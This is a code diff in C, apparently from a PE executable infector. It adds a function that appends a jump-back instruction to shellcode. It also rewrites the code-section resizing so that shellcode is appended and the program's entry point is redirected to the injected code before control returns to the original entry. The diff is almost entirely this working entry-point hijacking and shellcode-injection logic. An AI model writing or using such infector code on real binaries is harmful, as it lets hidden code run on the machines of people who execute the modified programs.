@@ -71,7 +71,28 @@ static size_t align(size_t size, size_t alignment) {
   return ((size >> 0x9) + alignment);
 }
 
-static int   getHeader(const char *filename, file *bin) {
+static int  patchShellcode(file *shellcode, uint32_t entryPoint, uint32_t oldEntryPoint) {
+  char    ins[5];
+  void    *header;
+  size_t  address;
+
+  address = -(entryPoint - oldEntryPoint + shellcode->size);
+  ins[0] = 0xe9;
+  ins[1] = (address >> 0) & 0xff;
+  ins[2] = (address >> 8) & 0xff;
+  ins[3] = (address >> 16) & 0xff;
+  ins[4] = (address >> 24) & 0xff;
+  if ((header = mmap(NULL, shellcode->size + 5, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
+    return (-1);
+  memcpy(header, shellcode->start, shellcode->size);
+  memcpy(header + shellcode->size, ins, 5);
+  munmap(shellcode->start, shellcode->size);
+  shellcode->size += 5;
+  shellcode->start = header;
+  return (0);
+}
+
+static int  getHeader(const char *filename, file *bin) {
   int         fd;
   struct stat stats;
 
@@ -142,11 +163,17 @@ static int  resizeCodeSection(file *bin, file shellcode) {
 
   optHeader = ((void *)bin->header) + sizeof(PE64_Ehdr);
   shHeader = ((void *)optHeader) + bin->header->optHeaderSize;
+  /* dprintf(1, "Entry point in file: %p\n", shHeader->paddr + (optHeader->entryPoint - shHeader->vaddr)); */
+  /* dprintf(1, "Shellcode size: %zu\n", shellcode.size); */
+  /* copyContent(bin, shHeader->paddr + (optHeader->entryPoint - shHeader->vaddr), shellcode.start, 2, 1); */
+  optHeader = ((void *)bin->header) + sizeof(PE64_Ehdr);
+  shHeader = ((void *)optHeader) + bin->header->optHeaderSize;
   copyContent(bin, shHeader->paddr + shHeader->memsz, shellcode.start, align(shellcode.size, optHeader->fileAlignment), 0);
   optHeader = ((void *)bin->header) + sizeof(PE64_Ehdr);
   optHeader->sizeofcode += shellcode.size;
   optHeader->sizeOfImage += shellcode.size;
   shHeader = ((void *)optHeader) + bin->header->optHeaderSize;
+  optHeader->entryPoint = shHeader->vaddr + shHeader->memsz;
   shHeader->memsz += shellcode.size;
   shHeader->filesz += align(shellcode.size, optHeader->fileAlignment);
   bin->header->symTbl += align(shellcode.size, optHeader->fileAlignment);
@@ -164,8 +191,8 @@ static int  resizeCodeSection(file *bin, file shellcode) {
 int     main(int argc, const char **argv) {
   file          bin;
   file          shellcode;
+  PE64_Shdr     *shHeader;
   PE64_OptHdr   *optHeader;
-  PE64_Shdr     *sectionHeader;
 
   if (argc != 2) {
     dprintf(2, "Not right number or arguments\n");
@@ -176,6 +203,9 @@ int     main(int argc, const char **argv) {
   optHeader = ((void *)bin.header) + sizeof(PE64_Ehdr);
   optHeader->checksum = 0;
   if (getShellcode(&shellcode, optHeader->fileAlignment) == -1)
+    return (1);
+  shHeader = ((void *)optHeader) + bin.header->optHeaderSize;
+  if (patchShellcode(&shellcode, shHeader->vaddr + shHeader->memsz, optHeader->entryPoint) == -1)
     return (1);
   if (resizeCodeSection(&bin, shellcode) == -1)
     return (1);
